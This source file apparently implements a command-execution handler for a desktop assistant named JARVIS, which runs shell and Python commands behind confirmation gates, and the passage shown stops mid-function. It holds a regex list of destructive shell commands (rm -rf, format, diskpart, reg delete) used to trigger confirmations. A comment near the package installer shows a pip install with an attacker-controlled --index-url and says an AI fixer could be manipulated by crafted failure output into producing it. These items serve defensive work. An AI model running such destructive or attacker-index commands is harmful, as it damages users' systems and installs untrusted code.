"""Handler: code_execution.

WARNING — DELIBERATE-RCE ENDPOINT
=================================
This handler executes arbitrary user- or AI-generated commands and Python code
in the JARVIS process tree. There is no sandbox; the gates below are
defence-in-depth and must be kept in place.

Gates, in order of trust:

  1. `config.code_exec_enabled` (R2-5) — master kill switch. When False, every
     action short-circuits with an explicit "disabled" reply. Use this to run
     JARVIS on a shared machine without exposing the RCE endpoint.
  2. `_danger_check` — narrow regex that catches the loudest destructive
     shell patterns (rm -rf, format C:, Remove-Item -Recurse -Force, …) and
     returns a confirm card before subprocess launch. Treat as best-effort
     defence-in-depth, not a sandbox.
  3. AI-generated shell commands from `_nl_to_command`, `_attempt_fix`, and
     `_run_plan` (R2-1, R2-7) require explicit user confirmation by default.
     The escape hatch is `config.allow_ai_command_autorun=True` — only enable
     it on a trusted single-user machine; Sonnet's `auto_safe` self-rating is
     trusted ONLY when the user has explicitly opted in.
  4. `run_python` requests a session-first-use confirm (R2-5) because Python
     bytecode bypasses the shell danger regex entirely. The session flag
     clears on JARVIS restart, never via a runtime path.
  5. `install_package` only accepts PEP 508 / npm safelisted specs (R2-6) —
     flags and shell metas are rejected before subprocess launch.

`executor.py` strips underscore-prefixed keys from `params` before dispatch
(R2-2), so the brain can't inject `_danger_confirmed`, `_run_python_session_
confirmed`, or any other internal gate-state magic key from here.

Do not relax any of these gates without an explicit security review.
"""

from __future__ import annotations

import atexit
import os
import platform
import re
import shlex
import shutil
import subprocess
import sys
import threading
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Callable, Optional

from core.handlers.shared import _ok, _err, request_confirmation
from core.personality import JARVIS_SHELL_RESULTS_PROMPT


# ── Config probes (R2-1 / R2-5 / R2-7) ────────────────────────────────────────
# Lazy-imported so tests can monkeypatch config without touching this module.

def _code_exec_enabled() -> bool:
    """Return False when the handler should refuse every action."""
    try:
        from config.settings import config
        return bool(getattr(config, "code_exec_enabled", True))
    except Exception:
        return True


def _autorun_allowed() -> bool:
    """Return True when AI-generated shell commands may run without user confirm.

    Default is False — every command from `_nl_to_command`, `_attempt_fix`, and
    `_run_plan` shows a confirm card before subprocess launch.
    """
    try:
        from config.settings import config
        return bool(getattr(config, "allow_ai_command_autorun", False))
    except Exception:
        return False

# Background processes launched via run_background — pid → Popen
# R2-14: guarded by _bg_procs_lock. Read/write happens from the dispatch
# thread (run_background, kill_process) and from atexit cleanup; dict.pop
# + iteration are not atomic together so we lock every access.
_bg_procs: dict[int, "subprocess.Popen[str]"] = {}
_bg_procs_lock = threading.Lock()


def _terminate_bg_procs() -> None:
    """Atexit hook: terminate every tracked background process on JARVIS exit.

    Previously these leaked across restarts — a `run_background` python server
    survived JARVIS shutdown and the user had to kill it manually. We hold the
    lock for the snapshot then drop it before .terminate() / .kill() (which
    may block briefly) so a slow child can't block the rest of cleanup.
    """
    with _bg_procs_lock:
        if not _bg_procs:
            return
        snapshot = list(_bg_procs.items())
        _bg_procs.clear()
    print(f"[code_exec] terminating {len(snapshot)} background process(es) on exit", file=sys.stderr)
    for pid, proc in snapshot:
        try:
            if proc.poll() is None:  # still running
                proc.terminate()
                try:
                    proc.wait(timeout=2)
                except subprocess.TimeoutExpired:
                    proc.kill()
        except Exception as exc:
            print(f"[code_exec] failed to terminate PID {pid}: {exc!r}", file=sys.stderr)


atexit.register(_terminate_bg_procs)


def _truncate(text: str, limit: int = 2000) -> str:
    if len(text) > limit:
        return text[:limit] + f"\n[truncated — {len(text)} chars total]"
    return text


# R2-6: PEP 508 + npm spec safelists for install_package. A regex safelist is
# stronger than a denylist because anything outside the grammar — whitespace,
# `--index-url`, `;`, `|`, `&`, backticks, $, shell metas — is rejected by
# virtue of not matching. We're not running pip/npm/uv through a shell, so
# `>` inside `requests>=2.0` is harmless on the subprocess.run(list) path —
# but a leading `-` would still be parsed by pip as a flag, hence the
# explicit early-reject.
_PEP508_SPEC_RE = re.compile(
    r"^[A-Za-z0-9][A-Za-z0-9._-]*"
    r"(\[[A-Za-z0-9_,.\-]+\])?"
    r"((==|>=|<=|!=|~=|>|<)[A-Za-z0-9._*+!-]+"
    r"(,(==|>=|<=|!=|~=|>|<)[A-Za-z0-9._*+!-]+)*)?$"
)
_NPM_SPEC_RE = re.compile(
    r"^(@[A-Za-z0-9._-]+/)?[A-Za-z0-9][A-Za-z0-9._-]*(@[A-Za-z0-9._-]+)?$"
)


def _validate_package_spec(spec: str, manager: str) -> str | None:
    """Return None if spec is safe to pass to pip/npm/uv, else an error message."""
    s = (spec or "").strip()
    if not s:
        return "Empty package spec"
    if s.startswith("-"):
        return f"Package spec must not start with '-' (would be parsed as a flag): {spec!r}"
    if manager in ("pip", "uv"):
        if not _PEP508_SPEC_RE.match(s):
            return (
                f"Invalid pip/uv package spec: {spec!r} — "
                f"must be a PEP 508 name (e.g. 'requests', 'requests>=2.0', 'requests[crypto]==2.31.0')"
            )
    elif manager in ("npm", "node"):
        if not _NPM_SPEC_RE.match(s):
            return (
                f"Invalid npm package spec: {spec!r} — "
                f"must be 'name', '@scope/name', or 'name@version'"
            )
    return None


def _valid_cwd(cwd: str | None) -> str | None:
    if not cwd:
        return None
    try:
        p = Path(str(cwd).strip().strip('"')).expanduser()
        return str(p) if p.is_dir() else None
    except Exception:
        return None


def _resolve_script_path(script_hint: str, cwd: str | None) -> Path | None:
    hint = (script_hint or "").strip().strip('"')
    if not hint:
        return None
    p = Path(hint).expanduser()
    if p.exists():
        return p

    roots: list[Path] = []
    vcwd = _valid_cwd(cwd)
    if vcwd:
        roots.append(Path(vcwd))
    roots.append(Path.cwd())

    # Direct relative checks first (fast path)
    for r in roots:
        rp = (r / p)
        if rp.exists():
            return rp

    # Basename search for common "run matrix_rain.py" style follow-ups.
    # Keep bounded to avoid expensive full-drive scans.
    if p.suffix and len(p.parts) == 1:
        name = p.name
        for r in roots:
            try:
                matches: list[Path] = []
                for m in r.rglob(name):
                    if m.is_file():
                        matches.append(m)
                        if len(matches) >= 12:
                            break
                if matches:
                    matches.sort(key=lambda x: (len(x.parts), str(x)))
                    return matches[0]
            except Exception:
                continue
    return None


# ── CommandBlock — structured session memory ──────────────────────────────────

@dataclass
class CommandBlock:
    id: str               = field(default_factory=lambda: uuid.uuid4().hex[:8])
    command: str          = ""
    output: str           = ""
    exit_code: int        = 0
    duration_ms: int      = 0
    cwd: str              = ""
    timestamp: str        = field(default_factory=lambda: datetime.now().isoformat(timespec="seconds"))
    ai_generated: bool    = False
    explanation: str      = ""
    fix_applied: bool     = False

_BLOCK_STORE: list[CommandBlock] = []   # session memory, capped at 50
_BLOCK_STORE_LOCK = threading.Lock()


def _store_block(block: CommandBlock) -> None:
    """Append block to session store; evict oldest when over cap."""
    with _BLOCK_STORE_LOCK:
        _BLOCK_STORE.append(block)
        if len(_BLOCK_STORE) > 50:
            _BLOCK_STORE.pop(0)


def _recent_blocks(n: int = 3) -> list[CommandBlock]:
    """Thread-safe snapshot of the last *n* command blocks."""
    with _BLOCK_STORE_LOCK:
        return list(_BLOCK_STORE[-n:])


# ── Environment context ───────────────────────────────────────────────────────

def _build_env_context() -> dict:
    """Snapshot of the current shell environment — injected into all AI calls."""
    def _git_branch() -> Optional[str]:
        try:
            r = subprocess.run(
                ["git", "branch", "--show-current"],
                capture_output=True, text=True, timeout=3,
            )
            return r.stdout.strip() or None
        except Exception:
            return None

    return {
        "cwd":            os.getcwd(),
        "os_version":     platform.version(),
        "python_version": sys.version.split()[0],
        "git_repo":       Path(".git").exists(),
        "git_branch":     _git_branch(),
        "installed_tools": [
            t for t in ["git", "python", "node", "npm", "pip",
                         "docker", "code", "uv", "cargo", "go", "java", "pwsh"]
            if shutil.which(t)
        ],
        "last_3_blocks": [
            {"cmd": b.command, "exit": b.exit_code, "ok": b.exit_code == 0}
            for b in _recent_blocks(3)
        ],
    }


# ── Pre-execution danger detection ────────────────────────────────────────────

_DANGER_PATTERNS: list[re.Pattern] = [
    re.compile(p, re.IGNORECASE) for p in [
        r"rm\s+-rf",
        r"del\s+/[sfqSFQ]",
        r"format\s+[a-z]:",
        r"shutdown\s+/[srhSRH]",
        r"taskkill.{0,20}system",
        r"reg\s+delete",
        r"rd\s+/s\s+/q\s+[a-zA-Z]:\\",
        r"diskpart",
        r"bcdedit",
        r"cipher\s+/w",
        r"net\s+user.+/delete",
        r"icacls.+/grant",
        r"Remove-Item.+-Recurse.+-Force",
    ]
]


def _danger_check(command: str, on_confirm: Callable[[], dict] | None = None) -> Optional[dict]:
    """Return a confirmation/blocking dict if the command matches a danger pattern."""
    for pat in _DANGER_PATTERNS:
        if pat.search(command):
            msg = f"Dangerous command detected: {pat.pattern!r}. Confirm to proceed."
            if on_confirm is None:
                return _err(f"Dangerous command blocked: {pat.pattern!r}")
            result = request_confirmation(msg, on_confirm)
            result.update({"confirm_type": "danger", "subject": command})
            return result
    return None


def _ai_command_confirmation(
    prompt: str,
    command: str,
    cwd: str | None,
    *,
    confirm_type: str = "ai_command",
) -> dict:
    """R2-1: confirm an AI-generated shell command before subprocess launch.

    The registered callback runs `command` directly via `_stream_execute` —
    it never re-enters `_nl_to_command` / `_attempt_fix` / `_plan_steps`, so
    confirming this card cannot trigger a second Sonnet call.

    `confirm_type` is surfaced on the result dict for the UI ("ai_command",
    "fix", "ai_plan"); `fix_applied` is set only on the fix path so retry
    logic in `_post_execute` doesn't loop on the same failure.
    """
    def _run_confirmed() -> dict:
        try:
            args = shlex.split(command)
        except Exception as exc:
            return _err(f"Could not parse command: {exc}")
        out, exit_code, dur = _stream_execute(args, cwd=cwd, timeout=60)
        _store_block(CommandBlock(
            command=command, output=out, exit_code=exit_code,
            duration_ms=dur, cwd=os.getcwd(),
            ai_generated=True,
            fix_applied=(confirm_type == "fix"),
        ))
        return _ok(out) if exit_code == 0 else _err(out)

    result = request_confirmation(prompt, _run_confirmed)
    result.update({"confirm_type": confirm_type, "subject": command})
    return result


# ── run_python first-use gate (R2-5) ──────────────────────────────────────────
# Python code is not gated by `_danger_check` (which is shell-pattern only), so
# the first `run_python` call this session shows a confirmation card explaining
# that Python runs in the JARVIS process tree. The flag clears on restart; it
# has no runtime-reachable reset path so a confused workflow can't accidentally
# silence the gate.

_run_python_session_confirmed: bool = False
_run_python_session_lock = threading.Lock()


def _run_python_first_use_gate(code: str, cwd: str | None) -> dict | None:
    """Return a confirmation dict on the first run_python this session, else None."""
    with _run_python_session_lock:
        if _run_python_session_confirmed:
            return None

    def _on_confirm() -> dict:
        global _run_python_session_confirmed
        with _run_python_session_lock:
            _run_python_session_confirmed = True
        # Recursive dispatch — the gate is now satisfied so this falls through
        # to the real run_python branch.
        return _handle_code_execution(
            "run_python",
            {"code": code, "working_directory": cwd},
        )

    snippet = code if len(code) <= 200 else code[:200] + "…"
    prompt = (
        "run_python executes arbitrary Python in the JARVIS process tree — "
        "this bypasses the shell danger regex. Confirm once to enable for "
        "the rest of this session.\n\n"
        f"  {snippet}"
    )
    result = request_confirmation(prompt, _on_confirm)
    result.update({"confirm_type": "run_python_first_use", "subject": code[:200]})
    return result


# ── Streaming execution ───────────────────────────────────────────────────────

def _stream_execute(
    args: list[str],
    cwd: str | None,
    timeout: int = 30,
) -> tuple[str, int, int]:
    """Run *args* via Popen, stream stdout+stderr line-by-line via Qt signals.

    A reader thread drains the pipe so the main worker thread can wait() with a
    hard timeout.  The Qt main thread is never touched — signals use auto-connect
    (queued across threads).

    Returns: (full_output, exit_code, duration_ms)
    """
    from core.signals import signals

    output_lines: list[str] = []
    t_start = time.monotonic()

    try:
        proc = subprocess.Popen(
            args,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            cwd=cwd,
            shell=False,
            encoding="utf-8",
            errors="replace",
        )
    except Exception as exc:
        duration_ms = int((time.monotonic() - t_start) * 1000)
        try:
            signals.terminal_done.emit(-1)
        except Exception:
            pass
        return str(exc), -1, duration_ms

    def _reader():
        for raw in proc.stdout:
            line = raw.rstrip("\n\r")
            output_lines.append(line)
            try:
                signals.terminal_line_ready.emit(line)
            except Exception:
                pass

    reader = threading.Thread(target=_reader, daemon=True)
    reader.start()

    timed_out = False
    try:
        proc.wait(timeout=timeout)
    except subprocess.TimeoutExpired:
        timed_out = True
        proc.kill()

    reader.join(timeout=3)

    if timed_out:
        msg = f"⏱️ Command timed out after {timeout}s."
        output_lines.append(msg)
        try:
            signals.terminal_line_ready.emit(msg)
        except Exception:
            pass

    exit_code = proc.returncode if proc.returncode is not None else -1
    duration_ms = int((time.monotonic() - t_start) * 1000)

    try:
        signals.terminal_done.emit(exit_code)
    except Exception:
        pass

    return _truncate("\n".join(output_lines)), exit_code, duration_ms


# ── AI intelligence layer ────────────────────────────────────────────────────

_SHELL_KEYWORDS: frozenset[str] = frozenset([
    "python", "python3", "pip", "pip3", "git", "cd", "dir", "ls", "npm",
    "node", "npx", "uv", "code", "echo", "type", "copy", "move", "del",
    "mkdir", "rmdir", "cls", "clear", "where", "which", "curl", "wget",
    "cargo", "go", "java", "javac", "docker", "kubectl", "ssh", "scp",
    "tar", "zip", "unzip", "powershell", "pwsh", "cmd", "wsl", "choco",
    "winget", "reg", "sc", "net", "ipconfig", "ping", "tracert", "netstat",
    "tasklist", "taskkill", "robocopy", "xcopy", "attrib", "icacls", "setx",
    "set", "call", "start", "timeout", "find", "findstr", "sort", "more",
    "fc", "comp", "cat", "grep", "awk", "sed",
])


def _looks_like_natural_language(command: str) -> bool:
    """True if the command's first word is not a known shell keyword."""
    if not command.strip():
        return False
    first = command.strip().split()[0].lower().rstrip(".,;:")
    return first not in _SHELL_KEYWORDS


def _nl_to_command(natural_language: str, env_ctx: dict) -> str | None:
    """Convert natural language to a Windows shell command via Claude Haiku.
    Returns the raw command string, or None on failure.
    """
    try:
        import anthropic
        from config.settings import config
        if not config.anthropic_api_key:
            return None
        client = anthropic.Anthropic(api_key=config.anthropic_api_key)
        tools = ", ".join(env_ctx.get("installed_tools", []))
        git   = (f"Git branch: {env_ctx.get('git_branch')}"
                 if env_ctx.get("git_repo") else "Not a git repo")
        msg = client.messages.create(
            model="claude-haiku-4-5-20251001",
            max_tokens=256,
            timeout=10,
            system=(
                f"You are a Windows shell expert. "
                f"OS: {env_ctx.get('os_version', 'Windows')}. "
                f"Available tools: {tools}. "
                f"CWD: {env_ctx.get('cwd', '.')}. {git}. "
                "Respond with ONLY the exact PowerShell or CMD command to run. "
                "No explanation. No markdown. No backticks. Just the raw command."
            ),
            messages=[{"role": "user", "content": natural_language}],
        )
        cmd = msg.content[0].text.strip().strip("`").strip()
        return cmd if cmd else None
    except Exception:
        return None


def _explain_output(block: CommandBlock) -> str | None:
    """Ask Claude Haiku to summarise the result in JARVIS butler style.
    Only fires when output > 100 chars. Returns 1-2 sentence string or None.
    """
    if len(block.output) <= 100:
        return None
    try:
        import anthropic
        from config.settings import config
        if not config.anthropic_api_key:
            return None
        client = anthropic.Anthropic(api_key=config.anthropic_api_key)
        status = "succeeded" if block.exit_code == 0 else f"failed (exit {block.exit_code})"
        msg = client.messages.create(
            model="claude-haiku-4-5-20251001",
            max_tokens=128,
            timeout=10,
            system=JARVIS_SHELL_RESULTS_PROMPT,
            messages=[{"role": "user", "content": (
                f"Command: {block.command}\nStatus: {status}\n"
                f"Output:\n{block.output[:1500]}"
            )}],
        )
        return msg.content[0].text.strip()
    except Exception:
        return None


def _attempt_fix(block: CommandBlock, cwd: str | None) -> dict | None:
    """Ask Claude Sonnet to generate a safe fix for a failed command.
    Runs fix automatically if auto_safe=True; requests confirmation otherwise.
    Max 1 fix attempt per block — never retries the fix.
    Returns a result dict or None if no fix is available.
    """
    import json as _json
    try:
        import anthropic
        from config.settings import config
        if not config.anthropic_api_key:
            return None
        client = anthropic.Anthropic(api_key=config.anthropic_api_key)
        msg = client.messages.create(
            model="claude-sonnet-4-6",
            max_tokens=256,
            timeout=15,
            system=(
                "You are a Windows shell expert. A command failed. "
                'Return JSON only — no prose, no markdown fences:\n'
                '{"fix_command":"<exact command>","explanation":"<one sentence>","auto_safe":<bool>}\n'
                "auto_safe=true ONLY for: installing a missing package, correcting a flag, "
                "creating a missing directory. "
                "auto_safe=false for anything touching system files, registry, "
                "network config, or user accounts."
            ),
            messages=[{"role": "user", "content": (
                f"Failed command: {block.command}\nExit code: {block.exit_code}\n"
                f"Output:\n{block.output[:1500]}"
            )}],
        )
        raw = re.sub(r"```(?:json)?", "", msg.content[0].text).strip().strip("`").strip()
        fix_data  = _json.loads(raw)
        fix_cmd   = fix_data.get("fix_command", "").strip()
        explain   = fix_data.get("explanation", "")
        auto_safe = bool(fix_data.get("auto_safe", False))
        if not fix_cmd:
            return None
        # Danger-check the AI-generated fix before touching anything
        if _danger_check(fix_cmd):
            auto_safe = False
        # R2-7: `auto_safe` is Sonnet's self-rating of the fix command — trust
        # it ONLY when the user has explicitly opted into AI autorun. The
        # default posture surfaces every Sonnet-generated command to the user
        # before subprocess launch.
        if auto_safe and _autorun_allowed():
            try:
                fix_args = shlex.split(fix_cmd)
            except Exception:
                return None
            out, exit_code, dur = _stream_execute(fix_args, cwd=cwd, timeout=60)
            _store_block(CommandBlock(
                command=fix_cmd, output=out, exit_code=exit_code,
                duration_ms=dur, cwd=os.getcwd(),
                ai_generated=True, fix_applied=True,
            ))
            if exit_code == 0:
                return _ok(f"{explain} — fix applied automatically.")
            return _err(f"Auto-fix also failed: {out}")
        prompt = f"{explain} Suggested fix: {fix_cmd}"
        return _ai_command_confirmation(prompt, fix_cmd, cwd, confirm_type="fix")
    except Exception:
        return None


def _post_execute(block: CommandBlock, cwd: str | None) -> dict | None:
    """Run fix (on failure) then explain. Returns override result dict or None.

    When the explanation replaces the user-facing `output`, the original raw
    subprocess text is preserved on the result dict under `raw_output` so the
    terminal panel can still show what actually printed (the spoken response
    uses the explanation, the panel uses raw_output).
    """
    if block.exit_code != 0 and not block.fix_applied:
        fix = _attempt_fix(block, cwd)
        if fix:
            block.fix_applied = True
            return fix
    explanation = _explain_output(block)
    if explanation:
        block.explanation = explanation
        result = _ok(explanation) if block.exit_code == 0 else _err(explanation)
        result["raw_output"] = block.output
        return result
    return None


# ── Multi-step agent ──────────────────────────────────────────────────────────

_MULTISTEP_PATTERN = re.compile(
    r"\b(set\s+up|install\s+and|create\s+and\s+run|configure\s+and|build\s+and|"
    r"clean\s+up\s+and|initialize\s+and|setup\s+and|deploy\s+and)\b",
    re.IGNORECASE,
)

_FAILURE_KEYWORDS = re.compile(
    r"\b(error|exception|failed|cannot|traceback|not\s+found|access\s+denied|permission\s+denied)\b",
    re.IGNORECASE,
)


def _output_suggests_failure(out: str) -> bool:
    """R2-25: scan only the last five lines — benign tools often mention
    'error' in help text or commit messages earlier in the buffer."""
    if not out:
        return False
    lines = out.splitlines()
    tail = "\n".join(lines[-5:])
    return bool(_FAILURE_KEYWORDS.search(tail))

# Windows cmd.exe built-ins — these are NOT standalone executables. Calling
# subprocess.run(["cd"]) on Windows fails with WinError 2 because cd lives
# inside cmd.exe, not on PATH. When run_shell receives one of these as the
# first token, we wrap the whole command as `cmd /c {code}` before execution.
_WIN_CMD_BUILTINS: frozenset[str] = frozenset({
    "cd", "dir", "echo", "cls", "set", "type", "copy", "move",
    "del", "mkdir", "rmdir", "ren", "attrib",
})


def _wrap_win_builtin(code: str) -> str:
    """If on Windows and `code` starts with a cmd built-in, wrap as cmd /c."""
    if sys.platform != "win32":
        return code
    stripped = code.lstrip()
    if not stripped:
        return code
    first = stripped.split(None, 1)[0].lower()
    if first in _WIN_CMD_BUILTINS:
        return f'cmd /c {code}'
    return code


def _plan_steps(goal: str, env_ctx: dict) -> list[str] | None:
    """Break a multi-step goal into ordered shell commands via Claude Sonnet.
    Returns list of command strings (max 8) or None on failure.
    """
    import json as _json
    try:
        import anthropic
        from config.settings import config
        if not config.anthropic_api_key:
            return None
        client = anthropic.Anthropic(api_key=config.anthropic_api_key)
        tools = ", ".join(env_ctx.get("installed_tools", []))
        msg = client.messages.create(
            model="claude-sonnet-4-6",
            max_tokens=512,
            timeout=20,
            system=(
                "You are a Windows shell expert. Break the user's goal into ordered shell commands. "
                f"Available tools: {tools}. CWD: {env_ctx.get('cwd', '.')}. "
                "Return a JSON array of command strings only. Max 8 steps. "
                "Each element must be a single, safe, executable command string. "
                'Example: ["git status","pip install flask","python app.py"] '
                "No explanations inside the array. No markdown."
            ),
            messages=[{"role": "user", "content": goal}],
        )
        raw   = re.sub(r"```(?:json)?", "", msg.content[0].text).strip().strip("`").strip()
        steps = _json.loads(raw)
        if not isinstance(steps, list):
            return None
        return [str(s).strip() for s in steps[:8] if str(s).strip()]
    except Exception:
        return None


def _execute_plan(steps: list[str], cwd: str | None) -> dict:
    """Execute a confirmed Sonnet plan step-by-step. Stop on first failure."""
    from core.signals import signals
    n = len(steps)
    for i, cmd in enumerate(steps, 1):
        # Header line so the terminal panel shows progress
        try:
            signals.terminal_line_ready.emit(f"── Step {i}/{n}: {cmd}")
        except Exception:
            pass
        danger = _danger_check(cmd)
        if danger:
            return {**danger, "error": f"Step {i} blocked — {danger['error']}"}
        try:
            args = shlex.split(cmd)
        except Exception as exc:
            return _err(f"Step {i}: could not parse command: {exc}")
        out, exit_code, duration_ms = _stream_execute(args, cwd=cwd, timeout=60)
        block = CommandBlock(
            command=cmd, output=out, exit_code=exit_code,
            duration_ms=duration_ms, cwd=os.getcwd(), ai_generated=True,
        )
        _store_block(block)
        if exit_code != 0:
            explanation = _explain_output(block) or out
            return _err(f"Step {i}/{n} failed: {explanation}")
        # Catch tools that exit 0 but still print failure keywords in the tail
        if _output_suggests_failure(out):
            explanation = _explain_output(block) or out
            return _err(f"Step {i}/{n} may have failed: {explanation}")
    plural = "s" if n != 1 else ""
    return _ok(f"Done — ran {n} step{plural}, all succeeded.")


def _run_plan(steps: list[str], cwd: str | None) -> dict:
    """R2-1 / R2-7: confirm the full Sonnet plan before subprocess launch.

    Confirming once per plan (rather than once per step) keeps multi-step
    routines usable while still gating Sonnet's authority to autonomously
    fan out shell commands. With `config.allow_ai_command_autorun=True`,
    runs immediately — but each step is still danger-regex-checked inside
    `_execute_plan`, so the loud destructive patterns still surface a card.
    """
    if not steps:
        return _err("Empty plan — nothing to run.")
    if _autorun_allowed():
        return _execute_plan(steps, cwd)
    plan_view = "\n".join(f"  {i}. {cmd}" for i, cmd in enumerate(steps, 1))
    prompt = f"Sonnet drafted a {len(steps)}-step plan. Run it?\n{plan_view}"
    result = request_confirmation(prompt, lambda: _execute_plan(steps, cwd))
    result.update({"confirm_type": "ai_plan", "subject": " && ".join(steps)})
    return result


# ── Main handler ──────────────────────────────────────────────────────────────

def _handle_code_execution(action: str, params: dict) -> dict:
    # R2-5: master kill switch. If the operator has disabled code execution in
    # settings, refuse every action up-front — no danger check, no AI calls,
    # no subprocess.
    if not _code_exec_enabled():
        return _err(
            "Code execution is disabled (config.code_exec_enabled=False). "
            "Enable it in settings to run shell, scripts, or run_python."
        )

    code = params.get("code", params.get("script_path", ""))
    cwd_raw = params.get("working_directory", None)
    cwd = _valid_cwd(cwd_raw)
    danger_confirmed = bool(params.get("_danger_confirmed", False))

    # ── Danger check (runs before anything else, no exceptions) ───────────────
    # NOTE: the danger regex is shell-pattern only, so it is best-effort for
    # `run_python` (Python doesn't speak shell). The run_python branch below
    # has its own session-first-use gate that fires regardless of this check.
    if code and not danger_confirmed:
        def _run_after_danger_confirm() -> dict:
            return _handle_code_execution(action, {**params, "_danger_confirmed": True})

        danger = _danger_check(str(code), _run_after_danger_confirm)
        if danger:
            return danger

    # ── Single empty-code guard for actions that require `code` ───────────────
    if not code and action in (
        "run_powershell", "run_cmd", "run_background",
        "run_python", "run_shell", "git_command", "npm_command", "run_script",
    ):
        return _err("No code or command provided")

    # ── PowerShell ────────────────────────────────────────────────────────────
    if action == "run_powershell":
        t0 = time.monotonic()
        try:
            result = subprocess.run(
                ["powershell.exe", "-NoProfile", "-NonInteractive", "-Command", code],
                capture_output=True, text=True, timeout=60, cwd=cwd,
            )
            out = _truncate((result.stdout or result.stderr or "").strip())
            _store_block(CommandBlock(
                command=code, output=out, exit_code=result.returncode,
                duration_ms=int((time.monotonic() - t0) * 1000), cwd=os.getcwd(),
            ))
            return _ok(out) if result.returncode == 0 else _err(out)
        except subprocess.TimeoutExpired:
            return _err("PowerShell command timed out after 60s")
        except FileNotFoundError:
            return _err("powershell.exe not found on this system")
        except Exception as exc:
            return _err(str(exc))

    # ── Command Prompt ────────────────────────────────────────────────────────
    if action == "run_cmd":
        t0 = time.monotonic()
        try:
            result = subprocess.run(
                ["cmd.exe", "/c", code],
                capture_output=True, text=True, timeout=60, cwd=cwd,
            )
            out = _truncate((result.stdout or result.stderr or "").strip())
            _store_block(CommandBlock(
                command=code, output=out, exit_code=result.returncode,
                duration_ms=int((time.monotonic() - t0) * 1000), cwd=os.getcwd(),
            ))
            return _ok(out) if result.returncode == 0 else _err(out)
        except subprocess.TimeoutExpired:
            return _err("CMD command timed out after 60s")
        except FileNotFoundError:
            return _err("cmd.exe not found on this system")
        except Exception as exc:
            return _err(str(exc))

    # ── Package install ───────────────────────────────────────────────────────
    if action == "install_package":
        package = params.get("package") or code
        if not package:
            return _err("No package name provided")
        manager = (params.get("manager") or "pip").lower()
        # R2-6: gatekeep BEFORE subprocess — Sonnet's _attempt_fix could be
        # socially-engineered into emitting `pip install "--index-url <attacker> requests"`
        # if the failure output looked like a missing-index hint. PEP 508 /
        # npm-spec safelist catches it.
        spec_error = _validate_package_spec(package, manager)
        if spec_error:
            return _err(spec_error)
        if manager == "pip":
            pip_bin = Path(sys.executable).parent / ("pip.exe" if sys.platform == "win32" else "pip")
            if not pip_bin.exists():
                # venv created without pip — bootstrap it silently then retry
                subprocess.run(
                    [sys.executable, "-m", "ensurepip", "--upgrade"],
                    capture_output=True, timeout=30,
                )
            if pip_bin.exists():
                cmd = [str(pip_bin), "install", package]
            else:
                cmd = [sys.executable, "-m", "pip", "install", package]
        elif manager in ("npm", "node"):
            cmd = ["npm", "install", package]
        elif manager == "uv":
            cmd = ["uv", "add", package]
        else:
            return _err(f"Unknown package manager {manager!r}. Use pip, npm, or uv.")
        t0 = time.monotonic()
        try:
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=120, cwd=cwd,
            )
            out = _truncate((result.stdout or result.stderr or "").strip())
            _store_block(CommandBlock(
                command=" ".join(cmd), output=out, exit_code=result.returncode,
                duration_ms=int((time.monotonic() - t0) * 1000), cwd=os.getcwd(),
            ))
            return _ok(out) if result.returncode == 0 else _err(out)
        except subprocess.TimeoutExpired:
            return _err("Package install timed out after 120s")
        except Exception as exc:
            return _err(str(exc))

    # ── Background execution ──────────────────────────────────────────────────
    if action == "run_background":
        try:
            args = shlex.split(code) if isinstance(code, str) else code
            proc = subprocess.Popen(
                args, cwd=cwd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            with _bg_procs_lock:
                _bg_procs[proc.pid] = proc
            return _ok(f"Started in background — PID {proc.pid}")
        except Exception as exc:
            return _err(str(exc))

    # ── Kill process ──────────────────────────────────────────────────────────
    if action == "kill_process":
        pid  = params.get("pid")
        name = params.get("process_name") or params.get("app_name") or ""
        try:
            import psutil
        except ImportError:
            return _err("psutil not installed — run: pip install psutil")

        if pid:
            try:
                # R3-10: never let JARVIS terminate its own process.
                if int(pid) == os.getpid():
                    return _err("Refusing to kill JARVIS's own process.")
                p = psutil.Process(int(pid))
                pname = p.name()
                p.kill()
                with _bg_procs_lock:
                    _bg_procs.pop(int(pid), None)
                return _ok(f"Killed {pname} (PID {pid})")
            except psutil.NoSuchProcess:
                return _err(f"No process with PID {pid}")
            except Exception as exc:
                return _err(str(exc))

        if name:
            # R3-10: near-exact match instead of substring. The old
            # `name in proc_name` let "python" kill JARVIS itself and "s" kill
            # everything. Match when the process name (or its .exe stem) equals
            # the requested name (or stem), case-insensitively.
            want      = name.strip().lower()
            want_stem = want[:-4] if want.endswith(".exe") else want
            self_pid  = os.getpid()

            def _name_matches(proc_name: str) -> bool:
                p = (proc_name or "").strip().lower()
                p_stem = p[:-4] if p.endswith(".exe") else p
                return p == want or p_stem == want_stem

            candidates = []
            for proc in psutil.process_iter(["pid", "name"]):
                try:
                    if proc.info["pid"] == self_pid:
                        continue  # R3-10: never kill JARVIS itself
                    if _name_matches(proc.info["name"]):
                        candidates.append(proc)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

            if not candidates:
                return _err(f"No process matching {name!r}")

            def _kill_candidates() -> dict:
                killed = []
                for proc in candidates:
                    try:
                        proc.kill()
                        killed.append(f"{proc.info['name']} (PID {proc.info['pid']})")
                        with _bg_procs_lock:
                            _bg_procs.pop(proc.info["pid"], None)
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        pass
                if killed:
                    return _ok(f"Killed: {', '.join(killed)}")
                return _err(f"No process matching {name!r}")

            # R3-10: a single unambiguous target was already confirmed at the
            # executor gate — kill it directly. A broad match (several PIDs) is
            # dangerous, so surface the exact candidate list and reconfirm.
            if len(candidates) == 1:
                return _kill_candidates()
            cand_list = ", ".join(
                f"{p.info['name']} (PID {p.info['pid']})" for p in candidates
            )
            prompt = (
                f"{len(candidates)} processes match {name!r}: {cand_list}. "
                "Kill all of them?"
            )
            return request_confirmation(prompt, _kill_candidates)

        return _err("Provide pid or process_name to kill a process")

    # ── Standard actions ──────────────────────────────────────────────────────
    if action == "run_python":
        # R2-5: session-first-use confirm. Python code bypasses the shell danger
        # regex entirely, so the first call this session shows a confirm card.
        # Subsequent calls run directly until JARVIS restarts.
        first_use = _run_python_first_use_gate(code, cwd_raw)
        if first_use:
            return first_use
        out, exit_code, duration_ms = _stream_execute(
